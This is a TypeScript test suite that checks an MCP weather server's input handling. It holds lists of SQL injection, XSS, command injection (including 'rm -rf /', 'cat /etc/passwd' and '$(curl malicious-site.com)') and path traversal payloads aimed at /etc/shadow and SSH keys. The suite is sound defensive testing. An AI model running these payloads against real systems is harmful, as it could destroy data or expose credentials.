import { Client } from "@modelcontextprotocol/sdk/client/index.js";
import { StdioClientTransport } from "@modelcontextprotocol/sdk/client/stdio.js";
import path from 'path';

/**
 * Security Tests - Testing for vulnerabilities and data protection
 * These tests ensure the MCP server handles sensitive data securely
 */
describe('MCP Server Security Tests', () => {
  let client: Client;
  let transport: StdioClientTransport;

  beforeAll(async () => {
    const serverPath = path.resolve(__dirname, '../../src/main.ts');
    
    transport = new StdioClientTransport({
      command: "npx",
      args: ["-y", "tsx", serverPath]
    });

    client = new Client({
      name: "security-test-client",
      version: "1.0.0"
    }, { capabilities: {} });

    await client.connect(transport);
  }, 15000);

  afterAll(async () => {
    if (client) {
      await client.close();
    }
  });

  describe('Input Sanitization', () => {
    it('should handle SQL injection attempts safely', async () => {
      const maliciousInputs = [
        "'; DROP TABLE cities; --",
        "London'; EXEC xp_cmdshell('dir'); --",
        "London' OR '1'='1",
        "'; INSERT INTO logs VALUES ('hacked'); --"
      ];

      for (const input of maliciousInputs) {
        const result = await client.callTool({
          name: "getWeather",
          arguments: { city: input }
        });

        // Should handle gracefully without exposing database errors or user input
        const responseText = (result.content as any)[0].text;
        expect(responseText).not.toContain('SQL');
        expect(responseText).not.toContain('database');
        expect(responseText).not.toContain('query');
        // Should not echo back the malicious input
        expect(responseText).not.toContain('DROP');
        expect(responseText).not.toContain('INSERT');
        expect(responseText).not.toContain("'");
        // Should provide safe error message
        expect(responseText).toMatch(/Error: (City not found|Invalid city name provided)/);
      }
    });

    it('should handle XSS attempts safely', async () => {
      const xssInputs = [
        "<script>alert('xss')</script>",
        "javascript:alert('xss')",
        "<img src=x onerror=alert('xss')>",
        "');alert('xss');//"
      ];

      for (const input of xssInputs) {
        const result = await client.callTool({
          name: "getWeather",
          arguments: { city: input }
        });

        // Should sanitize or reject XSS attempts
        const responseText = (result.content as any)[0].text;
        expect(responseText).not.toContain('<script>');
        expect(responseText).not.toContain('javascript:');
        expect(responseText).not.toContain('onerror=');
        expect(responseText).not.toContain('<img');
        // Should provide safe error message without echoing malicious input
        expect(responseText).toMatch(/Error: (City not found|Invalid city name provided)/);
      }
    });

    it('should handle command injection attempts', async () => {
      const commandInjectionInputs = [
        "London; rm -rf /",
        "London && cat /etc/passwd",
        "London | whoami",
        "London`cat /etc/hosts`",
        "$(curl malicious-site.com)"
      ];

      for (const input of commandInjectionInputs) {
        const result = await client.callTool({
          name: "getWeather",
          arguments: { city: input }
        });

        // Should not execute system commands
        const responseText = (result.content as any)[0].text;
        expect(responseText).not.toContain('root:');
        expect(responseText).not.toContain('/bin/bash');
        expect(responseText).not.toContain('uid=');
      }
    });
  });

  describe('Data Privacy', () => {
    it('should not expose sensitive environment variables', async () => {
      // Try to get server to expose environment variables
      const result = await client.callTool({
        name: "getWeather",
        arguments: { city: "test${HOME}test" }
      });

      const responseText = (result.content as any)[0].text;
      
      // Should not expose environment variable values
      expect(responseText).not.toContain(process.env.HOME || '/Users');
      expect(responseText).not.toContain(process.env.PATH || '/usr/bin');
      expect(responseText).not.toContain('SECRET');
      expect(responseText).not.toContain('TOKEN');
      expect(responseText).not.toContain('PASSWORD');
    });

    it('should not leak API keys in error messages', async () => {
      // This test assumes API keys might be used in future
      const result = await client.callTool({
        name: "getWeather",
        arguments: { city: "InvalidCity123" }
      });

      const responseText = (result.content as any)[0].text;
      
      // Should not expose any API keys or tokens
      expect(responseText).not.toMatch(/[A-Za-z0-9]{20,}/); // Long alphanumeric strings
      expect(responseText).not.toContain('api_key');
      expect(responseText).not.toContain('access_token');
      expect(responseText).not.toContain('bearer');
    });

    it('should sanitize file path traversal attempts', async () => {
      const pathTraversalInputs = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config",
        "/etc/shadow",
        "~/.ssh/id_rsa",
        "..%2F..%2F..%2Fetc%2Fpasswd"
      ];

      for (const input of pathTraversalInputs) {
        const result = await client.callTool({
          name: "getWeather",
          arguments: { city: input }
        });

        const responseText = (result.content as any)[0].text;
        
        // Should not access file system
        expect(responseText).not.toContain('root:x:');
        expect(responseText).not.toContain('ssh-rsa');
        expect(responseText).not.toContain('[boot loader]');
      }
    });
  });

  describe('Error Information Disclosure', () => {
    it('should not expose internal file paths in errors', async () => {
      const result = await client.callTool({
        name: "getWeather",
        arguments: { city: "" }
      });

      const responseText = (result.content as any)[0].text;
      
      // Should not expose internal file paths
      expect(responseText).not.toContain('/Users/');
      expect(responseText).not.toContain('/home/');
      expect(responseText).not.toContain('node_modules');
      expect(responseText).not.toContain(__dirname);
      expect(responseText).not.toContain('src/');
    });

    it('should not expose stack traces to users', async () => {
      // Try to trigger an error that might expose stack trace
      try {
        await client.callTool({
          name: "getWeather",
          arguments: { city: null as any }
        });
      } catch (error) {
        // Even if there's an error, it shouldn't expose internal details
      }

      const result = await client.callTool({
        name: "getWeather",
        arguments: { city: "InvalidCity123" }
      });

      const responseText = (result.content as any)[0].text;
      
      // Should not contain stack trace information
      expect(responseText).not.toContain('at Object.');
      expect(responseText).not.toContain('at Module.');
      expect(responseText).not.toContain('.js:');
      expect(responseText).not.toContain('TypeError:');
      expect(responseText).not.toContain('ReferenceError:');
    });

    it('should not expose server configuration details', async () => {
      const result = await client.callTool({
        name: "getWeather",
        arguments: { city: "test" }
      });

      const responseText = (result.content as any)[0].text;
      
      // Should not expose server configuration
      expect(responseText).not.toContain('localhost');
      expect(responseText).not.toContain('127.0.0.1');
      expect(responseText).not.toContain('port');
      expect(responseText).not.toContain('database');
      expect(responseText).not.toContain('connection');
    });
  });

  describe('Resource Protection', () => {
    it('should handle extremely large inputs without DoS', async () => {
      // Test with very large city name
      const largeInput = 'A'.repeat(10000);
      
      const startTime = Date.now();
      const result = await client.callTool({
        name: "getWeather",
        arguments: { city: largeInput }
      });
      const endTime = Date.now();

      // Should respond quickly even with large input
      expect(endTime - startTime).toBeLessThan(5000);
      expect((result.content as any)).toBeDefined();
    });

    it('should handle unicode and special encoding attacks', async () => {
      const unicodeInputs = [
        "🏴󠁧󠁢󠁥󠁮󠁧󠁿🏴󠁧󠁢󠁥󠁮󠁧󠁿🏴󠁧󠁢󠁥󠁮󠁧󠁿", // Flag emojis
        "\u0000\u0001\u0002\u0003", // Control characters
        "\uFEFF\uFFFE\uFFFF", // Unicode markers
        "𝕃𝕠𝕟𝕕𝕠𝕟", // Mathematical script
        "\x41\x42\x43", // Hex encoded
      ];

      for (const input of unicodeInputs) {
        const result = await client.callTool({
          name: "getWeather",
          arguments: { city: input }
        });

        // Should handle gracefully
        expect((result.content as any)).toBeDefined();
        const responseText = (result.content as any)[0].text;
        expect(responseText).toBeDefined();
      }
    });
  });

  describe('Protocol Security', () => {
    it('should validate tool arguments schema strictly', async () => {
      // Try to inject additional fields
      try {
        await client.callTool({
          name: "getWeather",
          arguments: { 
            city: "London",
            __proto__: { isAdmin: true },
            constructor: { prototype: { isAdmin: true } },
            admin: true,
            internal: "hack"
          }
        });
      } catch (error) {
        // Should reject due to schema validation
        expect(error).toBeDefined();
      }
    });

    it('should handle malformed MCP requests gracefully', async () => {
      // The MCP SDK should handle this, but we verify graceful failure
      try {
        await client.callTool({
          name: "nonExistentTool",
          arguments: { invalid: "data" }
        });
      } catch (error) {
        // Should be a proper MCP error, not a crash
        expect(error).toBeDefined();
      }
    });
  });
});
